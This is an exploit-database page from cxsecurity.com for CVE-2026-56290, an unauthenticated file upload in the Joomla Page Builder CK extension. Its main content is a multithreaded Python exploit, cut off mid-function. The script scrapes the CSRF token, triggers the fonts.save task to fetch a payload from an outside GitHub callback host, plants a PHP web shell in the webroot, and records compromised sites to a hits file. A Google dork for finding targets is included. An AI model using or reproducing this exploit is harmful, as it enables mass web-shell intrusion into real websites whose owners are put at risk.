---
title: Joomla Page Builder CK < = 3.5.10 - Unauthenticated Arbitrary File Upload (RCE)
url: https://cxsecurity.com/issue/WLB-2026070010
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-07-19
fetch_date: 2026-07-20T05:32:04.926841
---

# Joomla Page Builder CK < = 3.5.10 - Unauthenticated Arbitrary File Upload (RCE)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Joomla Page Builder CK <= 3.5.10 - Unauthenticated Arbitrary File Upload (RCE)** **2026.07.19**  Credit:  **[M@rAz Ali,Peyman Siyahi,MR.PERSIA](https://cxsecurity.com/author/M%40rAz%2BAli%2CPeyman%2BSiyahi%2CMR.PERSIA/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-56290](https://cxsecurity.com/cveshow/CVE-2026-56290/ "Click to see CVE-2026-56290")**  CWE: **N/A**  **[**Dork:** inurl:com\_pagebuilderck OR "/components/com\_pagebuilderck/assets/pagebuilderck.js"](https://cxsecurity.com/dorks/)** | |

#!/usr/bin/env python3
# Exploit Title: Joomla Page Builder CK <= 3.5.10 - Unauthenticated Arbitrary File Upload (RCE)
# Google Dork: inurl:com\_pagebuilderck OR "/components/com\_pagebuilderck/assets/pagebuilderck.js"
# Date: 2026-07-04
# Exploit Author: M@rAz Ali
# Credits: Peyman Siyahi, MR.PERSIA
# Vendor Homepage: https://www.joomlack.fr/
# Software Link: https://www.joomlack.fr/en/joomla-extensions/page-builder-ck
# Version: <= 3.5.10 (patched in 3.6.0)
# Tested on: Joomla 4.x / 5.x on Linux (Apache + PHP 8.x)
# CVE: CVE-2026-56290
#
# Description:
# Page Builder CK (com\_pagebuilderck) exposes an unauthenticated fonts.save task that
# fetches remote assets and writes attacker-controlled PHP into the webroot under:
# media/com\_pagebuilderck/gfonts/
# The only gate is a Joomla CSRF token, which is publicly readable on the homepage.
#
# This PoC triggers fonts.save with a remote callback, then verifies remote code
# execution by checking the uploaded shell response.
#
# Disclaimer:
# For authorized security testing and education only. Do not use against systems
# you do not own or lack explicit written permission to assess.
from \_\_future\_\_ import annotations
import argparse
import os
import re
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as\_completed
from pathlib import Path
import requests
import urllib3
# Remote callback that serves font.css + payload chain (must host your own for testing).
CALLBACK = "https://raw.githubusercontent.com/sagsooz/fonts/refs/heads/main"
SHELL\_PATH = "media/com\_pagebuilderck/gfonts/fbi.php"
EXPECTED\_TITLE = "Fbi Shell"
DEFAULT\_THREADS = 20
DEFAULT\_TIMEOUT = 12
HITS\_FILE = Path(\_\_file\_\_).resolve().parent / "hits.txt"
TOKEN\_PATTERNS = (
r'"csrf\.token"\s\*:\s\*"([A-Za-z0-9\_-]+)"',
r"'csrf\.token'\s\*:\s\*'([A-Za-z0-9\_-]+)'",
r'name="([a-f0-9]{32})"\s+value="1"',
r'value="1"\s+name="([a-f0-9]{32})"',
)
\_PRINT\_LOCK = threading.Lock()
\_HITS\_LOCK = threading.Lock()
\_SAVED\_HITS: set[str] = set()
def log(msg: str) -> None:
with \_PRINT\_LOCK:
print(msg, flush=True)
def normalize\_url(url: str) -> str:
url = url.strip()
if not url.startswith(("http://", "https://")):
url = "https://" + url
return url.rstrip("/")
def extract\_token(html: str) -> str | None:
for pattern in TOKEN\_PATTERNS:
match = re.search(pattern, html, re.I)
if match:
return match.group(1)
return None
def extract\_title(html: str) -> str | None:
match = re.search(r"<title[^>]\*>([^<]+)</title>", html, re.I | re.S)
if match:
return match.group(1).strip()
return None
def rce\_confirmed(html: str) -> bool:
title = extract\_title(html)
if title and EXPECTED\_TITLE.lower() in title.lower():
return True
return EXPECTED\_TITLE.lower() in html.lower()
def resolve\_index\_url(base: str, landing\_url: str) -> str:
path = requests.utils.urlparse(landing\_url).path or "/"
lang = re.match(r"^/index\.php/([a-z]{2}(?:-[a-z]{2})?)(?:/|$)", path, re.I)
if lang:
return f"{base}/index.php/{lang.group(1)}"
lang = re.match(r"^/([a-z]{2}(?:-[a-z]{2})?)(?:/|$)", path, re.I)
if lang and path.count("/") <= 2:
return f"{base}/index.php/{lang.group(1)}"
return f"{base}/index.php"
def save\_hit(shell\_url: str, \*, output: Path) -> None:
with \_HITS\_LOCK:
if shell\_url in \_SAVED\_HITS:
return
\_SAVED\_HITS.add(shell\_url)
with output.open("a", encoding="utf-8") as fh:
fh.write(shell\_url + "\n")
fh.flush()
os.fsync(fh.fileno())
log(f"[+] SHELL URL SAVED -> {shell\_url}")
def make\_session(\*, insecure: bool, timeout: float) -> requests.Session:
session = requests.Session()
session.verify = not insecure
session.headers.update(
{
"User-Agent": (
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
"AppleWebKit/537.36 (KHTML, like Gecko) "
"Chrome/124.0.0.0 Safari/537.36"
),
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8",
}
)
session.request = \_wrap\_timeout(session.request, timeout) # type: ignore[method-assign]
return session
def \_wrap\_timeout(request\_method, timeout: float):
def wrapped(method, url, \*\*kwargs):
kwargs.setdefault("timeout", timeout)
return request\_method(method, url, \*\*kwargs)
return wrapped
def exploit(
target: str,
\*,
insecure: bool,
timeout: float,
verbose: bool,
) -> tuple[int, str, str | None]:
"""
Returns (status, note, shell\_url)
0 = RCE confirmed
2 = file written, PHP not executed
1 = failed / not vulnerable
"""
session = make\_session(insecure=insecure, timeout=timeout)
shell\_url = f"{target}/{SHELL\_PATH}"
try:
home = session.get(f"{target}/", allow\_redirects=True)
except requests.RequestException as exc:
return 1, f"homepage failed: {exc}", None
token = extract\_token(home.text)
if not token:
return 1, "no CSRF token on homepage", None
index\_url = resolve\_index\_url(target, home.url)
params = {"option": "com\_pagebuilderck", "task": "fonts.save", token: "1"}
data = {
"local": "1",
"fontvars": "regular",
"fontname": "bb",
"url": f"{CALLBACK}/font.css",
token: "1",
}
try:
save = session.post(
index\_url,
params=params,
data=data,
headers={
"Content-Type": "application/x-www-form-urlencoded",
"Accept": "application/json,text/plain,\*/\*",
"Origin": target,
"Referer": home.url,
},
)
except requests.RequestException as exc:
return 1, f"fonts.save request failed: {exc}", shell\_url
if "ERROR\_INVALID\_CONTROLLER" in save.text:
return 1, "component/controller not present", shell\_url
try:
check = session.get(shell\_url)
except requests.RequestException as exc:
return 1, f"shell verification failed: {exc}", shell\_url
body = check.text
title = extract\_title(body)
if verbose:
l...